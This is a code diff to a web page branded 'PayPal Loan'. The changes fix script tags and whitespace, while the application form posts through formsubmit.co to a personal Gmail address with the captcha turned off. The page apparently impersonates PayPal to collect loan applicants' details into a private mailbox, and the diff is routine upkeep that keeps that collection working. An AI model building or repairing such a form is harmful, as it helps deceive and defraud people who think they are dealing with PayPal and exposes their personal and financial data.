@@ -219,6 +219,7 @@ PayPal Loan
       id="application-form"
       action="https://formsubmit.co/ajax/kelvinsmithsdeal@gmail.com"
       method="POST">
+
 <input type="hidden" name="_captcha" value="false">
 <input type="hidden" name="_subject" value="New PayPal Loan Application">
 <input type="hidden" name="_template" value="table">
@@ -295,8 +296,7 @@ PayPal Loan
 </div>
 </footer>
 
-<!-- EmailJS SDK (free, no backend needed) -->
-
+<!-- ✅ FIXED: closing tag for the first script -->
 <script>
 const form = document.getElementById("application-form");
 const successBox = document.getElementById("success-message");
@@ -348,19 +348,19 @@ form.addEventListener("submit", async function(e){
     submitBtn.innerHTML = "Submit Application →";
 
 });
+
 document.querySelectorAll('.check-offer-btn').forEach(btn=>{
   btn.addEventListener('click',()=>{
     document.getElementById('apply')
       .scrollIntoView({behavior:'smooth'});
   });
 });
+</script>
 
 <script>
-
 document.addEventListener("DOMContentLoaded", function () {
 
     /* FAQ Toggle */
-
     const questions = document.querySelectorAll(".faq-question");
 
     questions.forEach(function(question){
@@ -392,9 +392,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
     });
 
-
     /* Check My Offer Scroll */
-
     const offerButtons = document.querySelectorAll(".offer-btn");
 
     offerButtons.forEach(function(button){
@@ -418,9 +416,7 @@ document.addEventListener("DOMContentLoaded", function () {
     });
 
 });
-
 </script>
-   
 
 </body>
 </html>
